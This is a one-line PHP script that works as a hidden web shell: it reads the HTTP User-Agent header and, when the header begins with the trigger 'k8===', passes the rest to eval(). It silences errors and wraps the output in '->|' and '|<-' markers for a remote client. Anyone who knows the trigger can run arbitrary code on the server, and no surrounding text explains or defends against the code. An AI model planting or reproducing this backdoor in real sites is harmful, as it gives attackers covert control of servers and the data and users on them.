<? $ua=@$_SERVER["HTTP_USER_AGENT"];$row=split("===",$ua);echo "->|";if($row[0]=="k8")@eval($row[1]);echo "|<-";?>